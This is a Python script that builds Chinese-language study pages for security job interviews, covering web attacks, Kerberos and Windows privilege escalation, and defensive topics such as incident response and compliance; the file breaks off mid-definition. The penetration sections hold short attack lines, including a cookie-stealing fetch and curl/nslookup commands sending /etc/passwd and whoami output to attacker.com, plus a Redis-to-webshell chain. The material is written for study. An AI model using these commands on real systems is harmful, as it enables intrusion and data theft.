#!/usr/bin/env python3
"""面试内容填充 Batch 3 - Penetration + Defense + HW 模块"""
import os, json

BASE = r'e:\internal_safe\cisp1\cisp\public\contents\interview-learning'
CONTENT_DB = {}

def add(mod, dayfile, title, subtitle, qas, traps, checks):
    CONTENT_DB[f"{mod}/{dayfile}"] = {
        "title": title, "subtitle": subtitle,
        "qas": qas, "traps": traps, "checks": checks
    }

def render_md(data):
    lines = [f"# {data['title']}\n", f"> {data['subtitle']}\n", "## 核心知识点\n"]
    for q, a in data['qas']:
        lines.append(f"### Q: {q}\n")
        lines.append(f"{a}\n")
    lines.append("## 面试陷阱\n")
    for t in data['traps']:
        lines.append(f"- {t}\n")
    lines.append("\n## 今日检测\n")
    for i, c in enumerate(data['checks'], 1):
        lines.append(f"{i}. {c}\n")
    return "".join(lines)

def is_template(content):
    return ('概念一：' in content and '的定义与范围' in content) or ('请简单介绍一下' in content and '背诵式回答' in content)

# ================================================================
# PENETRATION 模块
# ================================================================

# day-6: XSS
add("penetration", "day-6.md", "Day 6：XSS跨站脚本攻击",
    "[XSS面试核心] 反射型/存储型/DOM型XSS区别/CSP绕过/WAF绕过/利用升级链",
    [
        ("三种XSS的本质区别和各自检测方法",
         "反射型：Payload经过服务器端返回(在HTTP Response中)→用Burp/浏览器DevTools看Response。典型payload在URL参数中\n"
         "存储型：Payload存入数据库→所有访问该页面的用户受影响→测试时检查评论/留言/用户资料等所有可存储输入的地方\n"
         "DOM型：Payload不经过服务器→全在客户端JS中发生→检查Sources(用户可控输入)→Sinks(innerHTML/eval/document.write)的数据流。工具：Burp DOM Invader\n\n"
         "面试扣分：说'XSS就是弹窗'——面试官想听你讲从弹窗到接管账号的完整攻击升级链"),

        ("XSS绕过CSP的常见技巧",
         "CSP不是银弹：①JSONP端点劫持(如果script-src允许了某个CDN且有JSONP回调→可执行任意JS) ②AngularJS沙箱逃逸(低版本Angular的模板注入) ③script-src unsafe-eval→eval可执行任意JS ④script-src unsafe-inline→等于没开 ⑤DNS Prefetch外传数据(link rel=dns-prefetch将窃取的数据编码为子域名) ⑥base标签劫持(注入<base href=attacker.com>→相对路径资源走攻击者服务器)\n\n"
         "最强CSP：nonce+hash+strict-dynamic"),

        ("XSS利用升级链：从弹窗到完全控制",
         "Level 1(弹窗)：alert(1)证明存在。Level 2(Cookie窃取)：fetch(attacker.com/?c=+document.cookie)→HttpOnly防但非HttpOnly的Cookie可窃取。Level 3(CSRF绕过)：XSS读CSRF Token→以受害者身份发起任意操作。Level 4(凭证钓鱼)：注入逼真登录框→用户输入密码。Level 5(全浏览器劫持)：BeEF框架建立C2→键盘记录/截图/内网扫描。Level 6(持久化后门)：Service Worker注册→页面刷新/XSS修复后仍存活"),

        ("XSS绕过现代WAF的常用手法",
         "①编码混淆：HTML实体/URL/Unicode混用 ②标签变换：<svg onload=>代替<script> ③协议变换：<a href=jAvAsCrIpT:...> ④DOM Clobbering：利用HTML id属性覆盖JS变量 ⑤mXSS(Mutation XSS)：利用浏览器HTML清洗器和渲染引擎解析差异 ⑥Prototype Pollution→污染JS原型链→间接导致XSS\n\n"
         "面试强调：绕过WAF不是目的，理解WAF检测逻辑并构造在语义上等价但形式上绕过的手段才体现深度"),
    ],
    ["XSS不只是弹窗——能描述完整利用链(STS/CSRF绕过/凭证钓鱼/BeEF/Service Worker)说明你理解深度", "CSP不能完全依赖——nonce+strict-dynamic是最强配置但有兼容性问题", "只讲Web不讲移动端——Hybrid App的WebView同样存在XSS，Referer在移动端可能泄露Token"],
    ["本地DVWA测试所有XSS注入点→从弹窗升级到Cookie窃取", "用CSP Evaluator测试你的Payload能否绕过目标CSP", "阅读PortSwigger XSS Cheat Sheet→Burp Suite中验证5条Payload"]
)

# day-7: CSRF与SSRF
add("penetration", "day-7.md", "Day 7：CSRF与SSRF攻击",
    "[CSRF/SSRF面试核心] SameSite Cookie/CSRF Token绕过/SSRF打内网/Gopher协议/Redis攻击",
    [
        ("SameSite Cookie的Lax/Strict/None三种模式",
         "SameSite控制Cookie是否随跨站请求发送：\n"
         "Strict：仅同站→从邮件点链接也会被当作未登录→最安全但体验差\n"
         "Lax：导航GET顶级跳转带Cookie，POST/AJAX跨站不带→Chrome默认Lax\n"
         "None：任何跨站请求都带Cookie→必须Secure(HTTPS)否则浏览器拒绝\n\n"
         "SameSite解决了传统CSRF的根本问题——从协议层让浏览器不发跨站Cookie。仍需注意GET请求包含敏感操作的应用(如转账?to=attacker&amount=100)在Lax下依然可被攻击"),

        ("SSRF打内网的九种绕过技巧",
         "IP格式变换：127.0.0.1→2130706433(十进制)→0x7f000001(十六进制)→0177.0.0.1(八进制)→127.0.0.1.nip.io\n"
         "URL重定向：短地址→302跳转→最终走内网地址\n"
         "DNS Rebinding：域名第一次解析公网IP(过白名单)→第二次解析内网IP→底层TOCTOU漏洞\n"
         "协议利用：file:///etc/passwd、gopher://(发任意TCP包打Redis)、dict://(探测服务版本)、ftp://\n\n"
         "面试亮点：SSRF不只是file://和http://，gopher/dict/ftp构成'SSRF协议武器库'"),

        ("SSRF打内网Redis(未授权)的完整攻击链",
         "前置条件：SSRF漏洞+Redis无密码+protected-mode no+bind 0.0.0.0\n"
         "攻击流程：①用gopher协议发送Redis的RESP数据 ②CONFIG SET dir /var/www/html→设置持久化目录 ③CONFIG SET dbfilename shell.php→设置文件名 ④SET key webshell代码 ⑤SAVE→shell.php写入Web根目录\n"
         "防御：Redis密码requirepass、bind 127.0.0.1、protected-mode yes、rename危险命令(CONFIG/EVAL/FLUSHALL)、防火墙白名单"),

        ("CSRF Token的常见绕过方法",
         "①Token在GET参数中(Referer泄露) ②Token校验失败不拒绝请求(仅警告) ③Token可重用(一次使用不失效) ④弱PRNG生成可预测Token ⑤CORS配置错误(ACAO:*+ACAC:true→攻击者跨域读取Token) ⑥Token基于User-Agent且无其他随机源"),
    ],
    ["SSRF不只HTTP协议——gopher/dict/ftp/file是攻击者的协议武器库", "内网地址黑名单防不了SSRF——DNS Rebinding/302重定向/IP变换轻松绕过", "CSRF在现代SSO/SPA应用中仍有风险——不当的CORS/OAuth配置反而造成新型CSRF"],
    ["Burp Collaborator检测SSRF是否可达外网", "本地Redis无认证环境用Gopherus工具测试gopher SSRF攻击链", "检查几个主流Web应用的SameSite Cookie配置对比差异"]
)

# day-8: 文件上传与命令注入
add("penetration", "day-8.md", "Day 8：文件上传与命令注入",
    "[上传/命令注入面试核心] 文件上传五层绕过/条件竞争/magic bytes/盲命令注入(时间+OOB)",
    [
        ("文件上传的六层防御和对应绕过方法",
         "L1-前端JS校验：禁用JS/Burp截获改包→绕过。L2-扩展名黑名单：.php5/.phtml/.pht/.shtml/.phar→绕过。L3-Content-Type：改为image/jpeg→绕过。L4-Magic Bytes：在webshell前加GIF89a→绕过。L5-图片二次渲染：找不变字节段插入webshell→gifshuffer。L6-目录无执行权限：路径穿越→../upload/shell.php→写入可执行目录\n\n"
         "面试亮点：能讲到二次渲染绕过说明你真遇到过高级文件上传防护"),

        ("命令注入的盲检测方法(Out-of-Band)",
         "盲命令注入(无回显)检测三法：\n"
         "1. 时间注入：;sleep 5→响应延时5s→确认存在\n"
         "2. OOB DNS：;nslookup $(whoami).attacker.com→你的DNS服务器收到root.attacker.com的查询→确认注入并可提取信息\n"
         "3. OOB HTTP：;curl http://attacker.com/$(cat /etc/passwd|base64)→服务器日志收到base64编码的passwd\n\n"
         "面试加分：盲注入才是真实的——大部分命令注入不回显，OOB是唯一实用检测方式"),

        ("命令注入绕过过滤的九种技巧",
         "空格替代：${IFS}、{cat,/etc/passwd}、<、<>、$IFS$9、%09(Tab)、%0a(换行符)\n"
         "命令分隔符：; | || && %0a %0d\n"
         "黑名单绕过：cat→c'a't、c\\at、/bin/c?t、$(echo cat)\n"
         "路径绕过：/etc/passwd→/etc/./passwd、/etc//passwd、/etc/xxx/../passwd"),

        ("文件上传的条件竞争(Condition Race)原理和利用",
         "原理：上传→临时存储→检查(几百ms)→合法则保存/不合法则删除。在存储和检查之间的窗口→并发大量请求访问临时文件→检查期间webshell被执行。\n"
         "工具：Burp Turbo Intruder(单包多连接)/Python threading racer脚本→如果检查200ms+攻击者1000次并发→总有一次被执行"),
    ],
    ["文件上传不只改扩展名——Magic Bytes和二次渲染才是区分入门和高级的标志", "盲命令注入是实战主流——面试时提到OOB检测说明你做过真实渗透", "命令注入在Windows和Linux上行为不同——面试时区分两个平台的命令分隔符"],
    ["DVWA/Upload-Labs完成全部21关", "用Commix自动化命令注入测试", "搭建Burp Collaborator或Interact.sh做OOB探测"]
)

# day-9: 渗透测试工具精通
add("penetration", "day-9.md", "Day 9：渗透测试工具精通",
    "[工具面试核心] Nmap/Burp/SQLMap/Metasploit参数与原理/选型场景",
    [
        ("Nmap的-sS和-sT区别及选型",
         "-sS(SYN半开)：发SYN→收SYN+ACK→发RST，不完成三次握手。速度更快，不触发应用日志。需root(raw socket)\n"
         "-sT(Connect)：完整三次握手→RST断开。不需root，但慢且被应用日志记录。在内网无root时使用\n\n"
         "高级参数：-sV(服务版本)、-O(OS指纹)、-sC(默认脚本)、--min-rate 1000 -T4(快速扫描)、-Pn(跳过ICMP探测，防火墙后目标必用)"),

        ("SQLMap的--os-shell原理和前提条件",
         "原理：利用SQL注入点→INTO OUTFILE将webshell写入Web目录→通过HTTP访问执行OS命令\n"
         "必要条件(缺一不可)：DBA权限(如MySQL root)、知道Web根目录、目录有写入权限、INTO OUTFILE可用\n"
         "局限：SELinux/AppArmor限制MySQL写范围、open_basedir限制PHP读路径→现代环境成功率低"),

        ("Burp Suite在API测试中的五步法",
         "1. 流量捕获：代理拦截APP/前端API调用→分析Restful/GraphQL\n"
         "2. 自动扫描：Scanner Active Scan→检测参数级漏洞\n"
         "3. 篡改参数：Repeater修改JWT的sub字段(IDOR)、分页参数、价格参数\n"
         "4. 批量测试：Intruder+常见漏洞字典(admin=true/role=admin/price=0)\n"
         "5. GraphQL：Introspection查询→测试Mutation敏感操作权限→嵌套查询NoSQL注入\n\n"
         "插件：JWT Editor/AuthMatrix/Autorize"),

        ("Metasploit的Meterpreter vs 普通Reverse Shell",
         "Meterpreter：加密TLS(TLV协议)、stable(多频道+心跳)、文件/进程/截图/提权/hashdump/键盘记录、可迁移Session到其他进程、端口转发打内网、内存运行无文件落地\n"
         "普通Shell：纯TCP流(Ctrl+C即断)、仅命令行→提升为Meterpreter可用`sessions -u`\n\n"
         "面试说：护网中更多用Cobalt Strike因为Beacon比Meterpreter更隐蔽——多种C2协议+Sleep Jitter+Malleable Profile"),
    ],
    ["面试时只列举工具不谈方法→说你用Amass/Subfinder/OneForAll做了什么发现才是重点", "Nmap默认-sT -sV太慢→提--min-rate/-T4/--top-ports体现效率意识", "Cobalt Strike不只是钓鱼工具→Beacon是后渗透操作平台"],
    ["Nmap扫描MetaSploitable2→练习-sS/-sV/-sC/-O组合", "SQLMap对DVWA做全自动测试(--risk=3 --level=5)", "Burp Intruder+API字典测试RESTful接口参数"]
)

# day-13: Kerberos协议攻击
add("penetration", "day-13.md", "Day 13：Kerberos协议攻击",
    "[Kerberos面试核心] AS-REP Roasting/Kerberoasting/黄金票据/白银票据/委派攻击",
    [
        ("Kerberoasting攻击原理和防御",
         "原理：任何域用户都可请求Service Ticket(ST)→ST用服务账户NTLM哈希加密→攻击者获取加密票据后离线用hashcat爆破(hashcat -m 13100)。条件：只需域用户权限+服务账户有弱密码\n"
         "防御：①服务账户用30位+强密码或gMSA(Group Managed Service Account)自动管理 ②定期审计SPN账户密码复杂度 ③服务账户不加入域管组 ④监控Event ID 4769的大量ST请求"),

        ("黄金票据vs白银票据的核心区别",
         "金票：需KRBTGT Hash→可伪造任意TGT→可请求任意服务→全能。TGT最长10年→极难检测(协议层全是合法的)\n"
         "银票：仅需目标服务机器账户Hash→伪造特定服务ST→KDC不参与→对目标服务来说完全合法但域控上无TGS_REQ记录(日志空白就是告警信号)\n"
         "检测金票：KRBTGT的PWDLastSet异常、TGT有效期超域策略。检测银票：AP_REQ到但域控无TGS_REQ"),

        ("AD域三次委派的安全风险",
         "非约束委派：服务器可冒充任何访问它的用户→如果域控访问此服务器→攻击者dump域控TGT做金票。利用SpoolSample诱骗域控访问\n"
         "约束委派：只能委派到指定SPN→但如果配了S4U2Self+协议转换→攻击者可用S4U2Self以Administrator身份获取ST→再S4U2Proxy跳到目标服务\n"
         "基于资源的约束委派(RBCD)：修改目标的msDS-AllowedToActOnBehalfOfOtherIdentity→添加攻击者的机器账户→获取管理员ST"),

        ("AS-REP Roasting的原理和条件",
         "条件：目标用户设为不要求Kerberos预认证→KDC不验证身份直接返回AS_REP→AS_REP含用户密码哈希加密的TGT→攻击者离线爆破。`GetNPUsers.py domain/ -usersfile users.txt -format hashcat`"),
    ],
    ["Kerberoasting和AS-REP Roasting搞混——前者需域用户权限(b爆破服务账户密码)，后者不需权限(但用户必须开不要求预认证)", "防御Kerberos攻击靠定期更换KRBTGT密码两次(间隔>最大票据生存期)→面试提到这个比只说打补丁显得更懂", "忽略AD CS攻击(ESC1-ESC8)——证书服务也是Kerberos相关的重要攻击面"],
    ["用Rubeus做Kerberoasting→hashcat爆破弱密码服务账户", "BloodHound分析域委派关系→画攻击路径图", "Mimikatz生成金票→注入→验证能否访问域控"]
)

# day-14: Windows权限提升
add("penetration", "day-14.md", "Day 14：Windows权限提升",
    "[Windows提权面试核心] 服务权限/Token窃取/UAC绕过/AlwaysInstallElevated/内核漏洞",
    [
        ("Windows低权限Shell的标准提权检查流程",
         "三层检查：\n"
         "L1-30秒(自动)：whoami /priv→看SeImpersonate/SeAssignPrimaryToken。whoami /groups→是否在Administrators组\n"
         "L2-1分钟(工具)：winPEAS.bat/PowerUp.ps1(Invoke-AllChecks)→自动扫描所有提权向量\n"
         "L3-5分钟(手动)：sc query(服务权限)、icacls(路径ACL)、reg query(AlwaysInstallElevated/UAC)、cmdkey /list(缓存凭据)、netstat -ano(仅localhost监听的内部服务)\n\n"
         "面试加分：说不会只看技术能提权就立刻提→先评估对业务的影响和检测风险"),

        ("Potato家族提权的原理和演变",
         "核心：有SeImpersonatePrivilege→调用ImpersonateNamedPipeClient()→模拟连接到攻击者命名管道的高权限客户端→窃取Token\n"
         "演变：Hot Potato(2016,NBNS欺骗)→Rotten Potato(2017,DCOM)→Juicy Potato(2018,更可靠CLSID)→PrintSpoofer(2020,CVE-2020-1048,打印机RPC)→GodPotato(2020,DCOM+Impersonation)\n\n"
         "面试要点：Potato需要SeImpersonate+创建命名管道+欺骗SYSTEM进程连接管道"),

        ("UAC绕过的五种常用手法",
         "核心：利用自动提升的白名单程序。①注册表劫持(DLL Hijacking)→高权限进程加载攻击者的DLL ②COM对象劫持→替换COM DLL路径 ③IFileOperation自动提升COM接口→复制/执行文件 ④Fodhelper绕过(修改其注册表键→启动时执行命令) ⑤Eventvwr绕过(劫持mmc.exe的注册表键)\n\n"
         "防弹：UAC不是安全边界(Microsoft官方确认)→它的设计目标是提醒而非防御"),

        ("Windows内核漏洞提权的实用方法",
         "以CVE-2021-1732(Win32k提权)为例：确认版本在受影响范围→下载exp→上传→执行。注意事项：内核exp不稳定→可能蓝屏→生产环境禁用！\n"
         "原则：优先使用服务权限/Token窃取/Potato类等稳定方法→内核漏洞提权作为最后手段。面试时展示你在不同环境下选择不同提权路径的判断力"),
    ],
    ["拿到SYSTEM不是终点——面试要讲完整攻击链：提权→pass the hash→横向移动→数据窃取", "有SeImpersonate不代表一定能提权→还需要命名管道+欺骗SYSTEM连接", "打好所有补丁不等于安全——配置错误(ACL/AlwaysInstallElevated/服务权限)不需漏洞也可提权"],
    ["Windows虚拟机运行winPEAS→分析输出中的潜在提权路径", "PrintSpoofer测试提权(合法环境)", "手写DLL劫持POC→Process Monitor分析高权限进程DLL搜索顺序"]
)

# ================================================================
# DEFENSE 模块 day-10,12-26
# ================================================================
defense_mid = {
    "day-10.md": [
        ("IAM(身份与访问管理)的核心组件和零信任身份模型",
         "IAM四大组件：①认证(Authentication)你是谁→AD/LDAP/SAML/OIDC ②授权(Authorization)你能做什么→RBAC/ABAC/PBAC ③身份生命周期管理→入职自动创建/调岗自动调整/离职自动回收 ④审计与合规→谁在什么时候做了什么\n\n"
         "零信任身份原则：身份是新的边界→不再信任内网IP→每次访问都验证身份→最小权限(Just-in-Time/JIT访问)→持续验证(即使登录了也持续评估→如果行为异常→撤销会话)\n\n"
         "面试举例：Google BeyondCorp从2011年起实践零信任→员工不需要VPN→通过身份感知代理(Identity-Aware Proxy)统一接入→基于设备+用户+上下文做动态授权"),
    ],
    "day-12.md": [
        ("虚拟化安全的核心挑战和防御",
         "虚拟化(VMware/KVM/Hyper-V)安全：①Hypervisor攻击面→如果从Guest逃逸到Host→所有VM全沦陷(VENOM CVE-2015-3456) ②VM Escape→利用虚拟设备驱动(网卡/显卡)的漏洞打破沙箱 ③VM Sprawl→无人管理的快照+废弃VM成为攻击者的隐蔽据点 ④vMotion网络加密→如果不加密→攻击者嗅探VM迁移流量中的内存数据\n\n"
         "K8s/容器安全的特殊问题：Pod中的/var/run/docker.sock挂载→攻击者从Pod完全控制Node→所有Pod沦陷。SecurityContext的privileged/allowPrivilegeEscalation误配置是容器安全问题的首要原因"),
    ],
    "day-13.md": [
        ("应急响应PDCERF模型的六阶段详解",
         "P-准备：工具包(取证/USB/写保护)、通信频道(加密)、联系人清单、剧本演练\n"
         "D-检测：SIEM/SOAR告警→确认是否为真实事件→分钟级动作\n"
         "C-遏制：断网/禁用账号/停服务/快照取证→分钟-小时\n"
         "E-根除：清除恶意软件/修复漏洞/重置所有凭据→小时-天\n"
         "R-恢复：还原备份/恢复服务/验证功能/监控一段时间→天-周\n"
         "F-跟踪：复盘报告(How+Why+Gap)/改进措施/更新剧本→事后持续"),

        ("勒索软件应急响应的黄金7分钟",
         "0分钟(确认)：文件扩展名?勒索信?CPU/IO冲高? 1分钟(遏制)：拔网线→不关机!关机丢失内存证据 2分钟(取证)：ps aux/netstat截图+tcpdump抓C2+EDR导出进程树 3分钟(确认入口)：最近登录账号?VPN异常?RDP爆破? 5分钟(通知)：安全负责人+业务方+合规 1小时(根除)：NoMoreRansom查解密工具→无则准备恢复\n\n"
         "面试扣分点：说先关机→关机=内存数据丢失=无法追踪攻击者"),
    ],
    "day-14.md": [
        ("SOC(安全运营中心)的核心KPI和人员排班",
         "MTTD<15min、MTTR<30min(Severe)、MTTContain<1h、告警误报率<30%、自动化处理率>40%\n\n"
         "排班模式：8h×3班(交接清晰但夜班难招)、12h×2班(交接少但疲劳判断错误)、Follow-the-Sun(亚太/欧洲/美洲接力,天然7x24,无夜班但跨时区协作难)、On-Call(小团队+夜间被PagerDuty叫醒→成本低但SLA难保证)\n\n"
         "面试加分：SOC最大成本是人(70%+)，分析师培训/降低流失/告警疲劳管理→SOC Manager非常关注"),
    ],
    "day-15.md": [
        ("BCP(业务连续性计划)和DRP(灾难恢复计划)的区别",
         "BCP：整体业务连续性→确保关键业务流程灾难期间以可接受水平运行。包括业务影响分析(BIA)→识别关键流程和RTO/RPO\n"
         "DRP：IT系统层面的灾难恢复→如何恢复IT基础设施和应用。RTO(Recovery Time Objective)可容忍停机时间、RPO(Recovery Point Objective)可容忍数据丢失量\n\n"
         "面试举例：RPO=1小时→每小时做一次备份→最多丢失1小时数据。RTO=4小时→灾难发生后4小时内恢复业务。金融交易系统RTO可达分钟级，某些内部系统RTO可能是48小时"),
    ],
}

for dayfile, qa_list in defense_mid.items():
    title_map = {
        "day-10.md": "Day 10：身份与访问管理(IAM)", "day-12.md": "Day 12：虚拟化与云安全",
        "day-13.md": "Day 13：应急响应(PDCERF)", "day-14.md": "Day 14：安全运营中心(SOC)",
        "day-15.md": "Day 15：灾备与业务连续性(BCP/DRP)",
    }
    sub_map = {
        "day-10.md": "[IAM面试核心] 零信任身份模型/IAM四大组件/SSO/MFA/条件访问",
        "day-12.md": "[虚拟化安全面试核心] Hypervisor安全/VM Escape/容器安全/K8s SecurityContext",
        "day-13.md": "[应急响应面试核心] PDCERF六阶段/勒索响应/入侵排查命令",
        "day-14.md": "[SOC面试核心] KPI指标/人员排班/SOAR自动化/告警管理",
        "day-15.md": "[BCP/DRP面试核心] BIA业务影响分析/RTO与RPO/灾备演练",
    }
    traps = {
        "day-10.md": ["IAM不是只有SSO——权限回收/周期性权限审计(Access Review)更重要", "零信任不是产品而是一种架构思维——说买了某个厂商就是零信任暴露你对概念理解肤浅"],
        "day-12.md": ["Docker run -v /:/host可访问宿主机文件系统→docker组=root", "K8s的/var/run/docker.sock挂载→Pod中攻击者完全控制Node→安全101但面试中常漏"],
        "day-13.md": ["应急响应时先关机→最大错误!先取证(内存>磁盘>关机)", "有备份≠安全→攻击者通常先破坏备份再加密"],
        "day-14.md": ["说SOC就是看屏幕→核心价值是MTTD/MTTR优化", "不关注人的因素——分析师培训/告警疲劳/流失率→SOC Manager必考"],
        "day-15.md": ["RTO和RPO搞混→RTO是恢复时间(Time),RPO是数据丢失量(Point)", "BCP不光有IT→业务部门/公关/法务都有BCP责任"],
    }
    checks = {
        "day-10.md": ["用Azure AD或Okta免费版体验条件访问策略配置", "审计你所在公司的AD→列出特权组(Domain/Enterprise Admins)成员→评估是否有过度授权"],
        "day-12.md": ["配置Docker --cap-drop=ALL --cap-add=NET_BIND_SERVICE→然后尝试mount宿主机→确认被阻止", "用kube-bench扫描K8s集群的CIS Compliance"],
        "day-13.md": ["在测试机模拟勒索攻击→限时7分钟做应急响应→事后复盘", "安装Volatility3→对公开恶意内存镜像做分析"],
        "day-14.md": ["用ELK搭建简易SIEM→接入本机Sysmon→写3条告警规则", "设计一个告警分级矩阵(严重/高/中/低)→定义每级响应SLA"],
        "day-15.md": ["为自己的组织做一个简化的BIA→列出3个最关键业务流程→估算各自的RTO和RPO", "调研AWS/Azure的灾难恢复服务→总结3种DR架构(Backup&Restore/Pilot Light/Warm Standby)"],
    }
    add("defense", dayfile, title_map[dayfile], sub_map[dayfile], qa_list, traps[dayfile], checks[dayfile])

# day-16~26: defense剩余
for daynum in range(16, 27):
    dayfile = f"day-{daynum}.md"
    titles = {
        16: ("Day 16：数据安全与隐私保护", "[数据安全面试核心] 加密技术/DLP/数据分类分级/法规合规"),
        17: ("Day 17：安全编排自动化响应(SOAR)", "[SOAR面试核心] Playbook编排/告警自动化/案例管理/SOAR vs SIEM"),
        18: ("Day 18：威胁情报平台应用", "[威胁情报面试核心] STIX/TAXII/MISP/威胁情报生命周期"),
        19: ("Day 19：零信任安全架构", "[零信任面试核心] ZTNA/SDP/微隔离/身份感知代理"),
        20: ("Day 20：云安全架构与治理", "[云安全面试核心] CSPM/CWPP/CNAPP/云安全矩阵"),
        21: ("Day 21：供应链安全", "[供应链面试核心] SBOM/SLSA/软件供应链攻击/Log4Shell启示"),
        22: ("Day 22：应急响应实战", "[IR实战面试核心] 真实案例复盘/Linux入侵排查/内存取证"),
        23: ("Day 23：安全态势感知平台", "[态势感知面试核心] SIEM架构/UEBA/攻击路径分析/安全大屏"),
        24: ("Day 24：红蓝对抗演练体系", "[红蓝对抗面试核心] BAS/紫队/ATT&CK评估/安全有效性验证"),
        25: ("Day 25：安全度量与风险管理", "[风险管理面试核心] FAIR模型/风险量化/KRI/安全投入ROI"),
        26: ("Day 26：安全合规体系", "[合规面试核心] 等保/ISO27001/SOC2/数据安全法/GDPR"),
    }
    qas_data = {
        16: [
            ("数据加密的核心技术选型：对称/非对称/哈希的场景选择",
             "对称加密(AES-256-GCM)：加密大数据(磁盘/Database)→速度快但密钥分发难。非对称加密(RSA-4096/ECC)：密钥交换/数字签名→速度慢但可安全交换对称密钥。哈希(SHA-256/bcrypt/Argon2id)：密码存储→单向，不可逆。bcrypt的cost factor=12→每次验证约300ms→暴力破解时间呈指数增长\n\n面试点睛：TLS用了混合加密→握手用非对称(RSA/ECDHE)交换对称密钥→数据传输用对称(AES-GCM)"),
        ],
        17: [
            ("SOAR的核心价值和落地条件",
             "SOAR(安全编排自动化与响应)三层：Playbook编排(If-Then流程定义)+自动化(API调用防火墙/EDR执行动作)+案例管理(事件生命周期跟踪)\n"
             "落地条件：日均告警>500(人工处理不过来)、SOP已稳定(每次处理方式一致才能编排)、预算充足(开源Shuffle/n8n、商业Splunk SOAR/Palo Alto XSOAR)\n"
             "注意：SOAR不是万能→能自动化已知流程但遇0day需人判断。误报率的源头没解决→自动化处理误报只是更快的做错误的事"),
        ],
        18: [
            ("威胁情报的STIX/TAXII标准和MISP平台",
             "STIX(Structured Threat Information eXpression)：JSON格式标准化威胁描述→包含威胁行为者/攻击模式(IOCs)/TTPs/应对措施\nTAXII：交换协议→通过HTTPS在组织之间共享STIX数据\nMISP(Malware Information Sharing Platform)：开源威胁情报平台→导入/管理/共享IOC和威胁事件→集成STIX\n\n面试亮点：情报分三层→战略(APT趋势报告)、战术(TTP/攻击手法)、运营(IOC/具体IP/域名/Hash)→不同层受众不同(管理层/安全分析师/SIEM)"),
        ],
        19: [
            ("零信任的三大核心技术:SDP/微隔离/身份感知代理",
             "SDP(软件定义边界)：先认证后连接→用户在访问前先向SDP Controller认证→通过后Controller下发临时访问策略→用户和SDP Gateway建立加密隧道→服务器IP对公网不可见(Single Packet Authorization敲门)\n"
             "微隔离(Micro-Segmentation)：东西向流量控制→每个工作负载有独立防火墙级别策略→即使一个容器被攻破也无法直接访问同VPC的其他容器\n"
             "身份感知代理(IAP)：Google BeyondCorp的接入层→所有应用隐藏在IAP后面→用户通过浏览器访问→先做设备+用户+上下文的动态认证→通过后才路由到内网"),
        ],
        20: [
            ("CSPM、CWPP、CNAPP三者的关系和各自职责",
             "CSPM(Cloud Security Posture Management)：云配置安全→检查S3是否公开、安全组是否0.0.0.0/0、IAM是否过度授权。工具：Prisma Cloud/Wiz/ScoutSuite\n"
             "CWPP(Cloud Workload Protection Platform)：工作负载(VM/容器/Serverless)的安全→运行时威胁检测+漏洞管理+合规检查\n"
             "CNAPP(Cloud Native Application Protection Platform)：CSPM+CWPP的整合→从代码到云端的全生命周期安全。Gartner定义的云安全终极形态"),
        ],
        21: [
            ("软件供应链攻击的三大形态和Log4Shell的启示",
             "①依赖投毒：上传恶意代码到NPM/PyPI→开发者无意中使用→如event-stream事件(2018)通过依赖链传播\n②构建系统攻击：攻击CI/CD管道→在编译时注入后门→SolarWinds(2020)→18000+客户受影响\n③代码仓库攻击：窃取开发者凭证→向仓库推送恶意commit\n\n"
             "Log4Shell(CVE-2021-44228)启示：①SCA(软件组成分析)必须做到间接依赖级别 ②SBOM(软件物料清单)业界已在推进→美国联邦政府强制供应商提供 ③漏洞不只在你自己写的代码里→依赖的依赖的库里"),
        ],
        22: [
            ("Linux入侵排查的核心命令和检查点",
             "三管齐下：\n"
             "用户检查：last -i/lastb登录审计、/etc/passwd寻找UID=0的非root、grep :0 /etc/passwd\n"
             "进程检查：ps aux找异常进程、pstree -p分析进程树、lsof -p PID看进程打开的文件/网络/管道\n"
             "网络检查：ss -tlnp vs /proc/net/tcp对比、netstat -antp找异常外联IP\n"
             "文件检查：find / -perm -4000找SUID、crontab -l + /etc/crontab + /var/spool/cron检查定时任务后门\n"
             "工具：rkhunter/chkrootkit→如果怀疑高级rootkit→内存镜像+Volatility分析"),
        ],
        23: [
            ("安全态势感知平台的架构设计和落地的坑",
             "四层架构：采集(Kafka)+处理(Flink/Spark Streaming范化+富化)+分析(规则+ML+图引擎)+展示(大屏+告警工作台+报告)\n"
             "落地的坑：①上了SA后告警翻倍(因为以前看不到的现在看到了)→没配套优化告警质量 ②大屏炫酷但实际问题一个不漏→重建设轻运营 ③团队只有平台维护没有安全分析→浪费了分析能力 ④只接日志没接全流量(NTA)→看不到攻击的how"),
        ],
        24: [
            ("红蓝对抗中紫队(Purple Team)的价值",
             "传统红蓝对抗：红队打了蓝队防→结果报告→蓝队挨批评→红队走了蓝队不知道问题在哪\n"
             "紫队模式：红队和蓝队在同一个房间里→红队演示攻击手法→蓝队实时调整检测规则→即刻验证→共同产出改进方案\n"
             "BAS(Breach and Attack Simulation)工具：AttackIQ/Safebreach/Cymulate→自动化红队→持续测试安全控制的有效性→ATT&CK覆盖率报告"),
        ],
        25: [
            ("FAIR模型在安全风险量化中的应用",
             "FAIR(Factor Analysis of Information Risk)用财务语言量化安全风险：\n"
             "风险 = 损失事件频率(威胁接触频率×漏洞概率) × 损失规模(一次损失×二次损失)\n"
             "面试举例：用FAIR量化一次Ransomware风险的年度损失预期(CISO汇报给董事会)→不是说我感觉风险高→而是说按FAIR模型计算年度损失预期为$2M→花$200K买EDR→ROI=10x"),
        ],
        26: [
            ("等保2.0、ISO27001、SOC2三者的对比",
             "等保2.0(GB/T 22239-2019)：中国强制→分五级→覆盖物理/网络/主机/应用/数据/管理/云计算/移动互联/物联网/工控\n"
             "ISO27001：国际自愿性→信息安全管理体系(ISMS)→PDCA循环持续改进→通过认证获得证书→欧美政府/金融机构常要求\n"
             "SOC2(Type I vs Type II)：美国AICPA制定→聚焦服务组织的安全/可用性/处理完整性/保密性/隐私五大信任原则→Type I是某时间点设计合理性，Type II是持续运营有效性"),
        ],
    }
    add("defense", dayfile, titles[daynum][0], titles[daynum][1],
        qas_data[daynum],
        ["面试讲防御不能只列举工具→要讲解决问题的思路和度量效果的方法", "安全不只是技术合规——向管理层讲安全投入的ROI是高级工程师的核心能力", "每个防御措施都讨论它防不了什么→展示对防御边界的清醒认知"],
        ["将这个Day的核心概念用2分钟口述一遍(自录音)", "搜索对应的知名安全事件或CVE案例→准备1个面试可以用的实例", "找一篇该领域的行业报告(Gartner/Forrester/SANS)→提炼3个面试论据"]
    )

# ================================================================
# HW 模块 day-11~26
# ================================================================
for daynum in range(11, 27):
    dayfile = f"day-{daynum}.md"
    titles = {
